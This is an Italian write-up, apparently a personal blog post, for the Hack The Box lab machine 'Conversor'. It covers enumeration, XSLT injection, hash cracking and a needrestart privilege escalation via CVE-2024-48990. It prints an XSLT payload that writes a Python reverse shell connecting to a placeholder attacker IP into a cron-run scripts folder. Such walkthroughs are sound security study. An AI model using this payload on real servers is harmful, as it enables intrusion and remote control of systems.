+++
date = '2026-05-20T18:45:11+02:00'
draft = false
title = 'Conversor Writeup IT'
+++
**Nome:** `joy.scd01`

**Data:** `24/01/2025`

![conversor_pwned.png](/images/imgs_conversor/conversor_pwned.png)

---
# Introduzione

***Conversor*** è la sesta macchina rilasciata durante la **stagione 9 (Gacha)**.
Un box **Linux di livello Easy**, che tratta l'exploit di un'interessante vulnerabilità: l'**XSLT Injection**.
In questo caso è stata sfruttata per ottenere l’accesso iniziale, creando uno script malevolo che viene poi eseguito automaticamente da un **cronjob**.

La Privilege Escalation necessita di eseguire prima uno spostamento orizzontale verso un altro utente, utilizzando "segreti" dumpati dal database interno, poi uno verticale per ottenere l'accesso a root, sfruttando una **vulnerabilità nota** presente in una specifica versione del binario **needrestart**.

---
# Tecniche Utilizzate

- **XSLT Injection → RCE**
- **Database Dump → Hash Cracking**
- **Sudo Misconfiguration → CVE-2024-48990**

---
# Enumerazione

## nmap

Scansione mirata con script e servizi  :

```bash
nmap -sC -sV -vvv nmap/services conversor
```

```bash
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
5555/tcp open  freeciv? syn-ack ttl 63
9002/tcp open  dynamid? syn-ack ttl 63
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Porte aperte**:
- **22/tcp** - SSH
- **80/tcp** - HTTP
- **5555/tcp** - freeciv?
- **9002/tcp** - dynamid?

---
## HTTP - Enumerazione Web

L'applicazione web, sostanzialmente, hosta un **convertitore** che permette all'utente di fare l'**upload** di un **file XML** e di un **template XSL** e lo restituisce in un formato più 💖"**_aesthetic_**"💖.

![aesthetic_cat.jpg](/images/imgs_conversor/aesthetic_cat.jpg)

**Noto due cose interessanti**:

1. Si può scaricare il **template XSL**:

![template_download.png](/images/imgs_conversor/template_download.png)

2. Si può scaricare il **codice sorgente** dell'applicazione:

![sourcecode_download.png](/images/imgs_conversor/sourcecode_download.png)

Inizialmente mi sono soffermato sull'**analisi del template** e cercando su Google per exploit riguardanti **file xsl**, ho trovato svariati siti che spiegano l'**XSLT Injection**:

_Una vulnerabilità in cui un **file XSLT** fornito dall’utente viene **processato lato server in modo insicuro**, permettendo ad un attaccante di: **Ottenere RCE, Leggere File Locali, XXE, SSRF o Scrivere File**._

L'ho subito testata eseguendo i **payload** di **recon** forniti da questo sito :
https://ine.com/blog/xslt-injections-for-dummies

Payloads
```xml
<xsl:value-of select="system-property('xsl:version')" />
<xsl:value-of select="system-property('xsl:vendor')" />
<xsl:value-of select="system-property('xsl:vendor-url')" />
```

La versione era decisamente vulnerabile.
A questo punto ho perso un po' di tempo a giocare con diversi payload, per familiarizzare con questa vuln, non riuscendo comunque poi a sfruttarla per ottenere una progressione nella macchina.

Allora mi sono messo ad analizzare attentamente il codice sorgente dell'applicazione.
E ho trovato:

- Un **database** interno (`users.db`)

![db_hint.png](/images/imgs_conversor/db_hint.png)

- Un **cronjob** eseguito dall'utente `www-data` che runnava qualsiasi **script Python** presente in `/var/www/conversor.htb/scripts/*.py`

![cronjob_hint.png](/images/imgs_conversor/cronjob_hint.png)

Questo cronjob rappresenta la chiave per ottenere l'accesso iniziale.

---
# Accesso Iniziale | XSLT Injection → RCE

Prendendo spunto da questa guida:
https://x.com/ptswarm/status/1796162911108255974/photo/1

**Ho craftato il mio payload**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
 <xsl:template match="/">
 <exploit:document href="/var/www/conversor.htb/scripts/fall.py" method="text">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<lport>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")</exploit:document>
 </xsl:template>
</xsl:stylesheet>
```

L'ho inserito nel template scaricato in precedenza e, dopo essermi messo in ascolto con **netcat**, ho fatto l'upload.
Dopo poco, avevo una shell come `www-data`:

![initial_access.png](/images/imgs_conversor/initial_access.png)

Ovviamente, da qui, il primo passo verso l'escalation è stato analizzare il database interno:

![database_dump.png](/images/imgs_conversor/database_dump.png)

---
# Movimento Laterale | Database Dump → Hash Cracking → fismathack

L'unico utente presente internamente, tra quelli registrati nel **db**, è `fismathack`.
Quindi, come sono solito fare se un hash non è troppo complesso, provo a crackarlo utilizzando: **https://crackstation.net/**

![cracked_hash.png](/images/imgs_conversor/cracked_hash.png)

Ho utilizzato la password per loggarmi tramite **SSH**:

 ![lateral_movement_fismathack.png](/images/imgs_conversor/lateral_movement_fismathack.png)

Nella home è presente la **user flag**.

![userflag.png](/images/imgs_conversor/userflag.png)

Quindi, user presa, accesso tramite ssh ottenuto, conosco la password...

Ovviamente ora: **sudo -l**

![chewing_riccio.gif](/images/imgs_conversor/chewing_riccio.gif)

---
# Privilege Escalation | Sudo misconfiguration → CVE-2024-48990 → root

L'utente `fismathack` può eseguire il binario **needrestart** come `root`, senza password

![sudol&version.png](/images/imgs_conversor/sudol&version.png)

Cercando su Google, la **versione 3.7** di **needrestart** risulta vulnerabile alla **CVE-2024-48990**.

_Questo binario può essere indotto a eseguire l’**interprete Python** utilizzando la **variabile d’ambiente PYTHONPATH** controllata dall’attaccante.
Manipolando questa variabile, l’attaccante può far sì che Python carichi **moduli malevoli** da percorsi scelti da lui, ottenendo una **Privilege Escalation Locale**_.

Ho utilizzato questo exploit:
https://github.com/ally-petitt/CVE-2024-48990-Exploit

![privesc_exploit.png](/images/imgs_conversor/privesc_exploit.png)

Per triggherarlo ho modificato la variabile di ambiente e ho runnato **needrestart** con sudo

![privesc_trigger.png](/images/imgs_conversor/privesc_trigger.png)

Ottenendo una **shell da root**

![system_proof.png](/images/imgs_conversor/system_proof.png)

**Root flag** presente in `/root`.

![rootflag.png](/images/imgs_conversor/rootflag.png)

---
# Conclusioni Finali

Box molto interessante ed istruttivo.

Non avevo mai sfruttato un'**XSLT Injection**, non riuscivo a capire quale fosse il giusto attacco per ottenere l'accesso iniziale... Questo ha reso la mia percezione del box noiosa, ma una volta dentro mi sono reso conto che il tempo passato a provare payloads diversi per capire come sfruttare questa vulnerabilità mi ha dato la possibilità di studiarla a 360°: dal suo funzionamento ai vari approcci di attacco per sfruttarla.

La Privilege Escalation è lineare, misconfigurazione semplice da trovare, ma comunque interessante per via del **path hijacking**.

**Fonti**:

-  **Blog di introduzione alla XSLT Injection da cui ho preso i payloads di recon** | https://ine.com/blog/xslt-injections-for-dummies
- **Linea guida che ho utilizzato per la creazione del Payload xslt per la creazione di file** | https://x.com/ptswarm/status/1796162911108255974/photo/1
- **Hash Cracker Online** | https://crackstation.net/
- **Exploit utilizzato per la Privilege Escalation** | https://github.com/ally-petitt/CVE-2024-48990-Exploit